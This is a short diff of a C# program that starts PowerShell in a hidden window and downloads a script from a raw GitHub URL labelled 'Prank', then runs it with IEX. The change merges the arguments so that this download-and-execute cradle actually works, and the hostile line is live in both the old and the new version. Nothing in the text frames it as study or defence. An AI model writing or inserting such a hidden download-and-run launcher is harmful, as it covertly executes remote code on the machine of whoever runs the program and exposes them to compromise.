@@ -4,8 +4,7 @@ using System.Diagnostics;
     class Test {
         static void Main() {
             Process.Start("Powershell.exe",
-            "-windowstyle hidden",
-            "-c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gfsmithak/grant-test/master/Temp/Prank')");
+            "-windowstyle hidden -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gfsmithak/grant-test/master/Temp/Prank')");
             }
          }
 
